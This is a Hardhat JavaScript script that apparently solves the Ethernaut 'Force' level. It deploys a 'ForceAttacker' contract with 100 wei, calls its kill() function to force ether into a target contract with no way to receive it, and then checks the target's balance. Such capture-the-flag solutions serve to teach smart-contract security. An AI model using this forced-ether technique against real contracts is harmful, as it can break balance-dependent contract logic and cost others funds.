const { ethers } = require("hardhat")
const { symbols, resetNode } = require("../helper-hardhat-config")

async function main() {
    await resetNode()
    let bal, tx, res
    let [attacker] = await ethers.getSigners()
    let instanceAddress = "0x25e3a83cBB8E89383785851843Cf1Aa5feC5d734"
    let attackerContractFactory = await ethers.getContractFactory(
        "ForceAttacker"
    )
    let attackerContract = await attackerContractFactory.deploy(
        instanceAddress,
        { value: 100 }
    )

    console.log(`Attacker Address: ${attacker.address}`)
    console.log(`Deployed attacker at address: ${attackerContract.address}`)

    // Attack
    tx = await attackerContract.kill()
    await tx.wait(1)

    // Check
    bal = await ethers.provider.getBalance(instanceAddress)
    if (bal > 0) {
        console.log(`${symbols.success} Force-fed contract, bal = ${bal} wei`)
    } else {
        console.log(`${symbols.error} Target still empty!`)
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.log(error)
        process.exit(1)
    })

module.exports = { main: main }
